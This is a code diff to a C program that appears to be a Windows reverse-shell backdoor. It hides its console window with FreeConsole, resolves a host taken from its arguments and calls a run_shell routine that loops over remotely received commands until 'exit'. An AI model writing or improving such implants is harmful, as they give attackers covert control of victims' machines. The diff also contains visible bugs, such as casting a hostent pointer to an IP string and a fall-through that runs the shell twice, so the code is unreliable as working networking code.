@@ -20,36 +20,37 @@
  int main( int argc, char **argv ){
 	 
 	 int port;
-	 char ip;
+	 char *ip;
+	 struct hostent *remote_ip;
 	 
 	 // Disable console window
 	 FreeConsole();
 	 
-	 if( argc != 4 ) {
+	 if( argc != 3 ) {
 		 
 		 // Default config
 		 char host[] = "127.0.0.1";
 		 port = 8080;
 		 run_shell( host, port );
 		 
-	} else if( strcmp( argv[3], "subdomain" ) == NULL ) {
+	} else {
 		
+		ip = argv[1];
+		
+		remote_ip = gethostbyname( ip );
+				
 		// Subdomain to IP (gethostbyname())
-		if( ip = gethostbyname( argv[1] ) == NULL ) {
+		if( remote_ip == NULL )
 			exit(1);
-			
-		}
 		
 		port = atoi( argv[2] );
-		run_shell( ip, port );
+		run_shell( (char *)remote_ip, port );
 		
-		
-	} else if( strcmp( argv[3], "ip" ) == NULL ) {
-		
-		port = atoi( argv[2] );
-		run_shell( argv[1], port );
 		
 	}
+		// If getting the IP from subdomain fails we can assume it is in IPv4 format
+		port = atoi( argv[2] );
+		run_shell( argv[1], port );
 	
 return 0;
 }
@@ -132,6 +133,6 @@ void run_shell( char *server, int port ){
 		}
 				
 	} while( strcmp( recv_data, "exit \n") != 0 && TRUE );
-		
+			
 }
 	
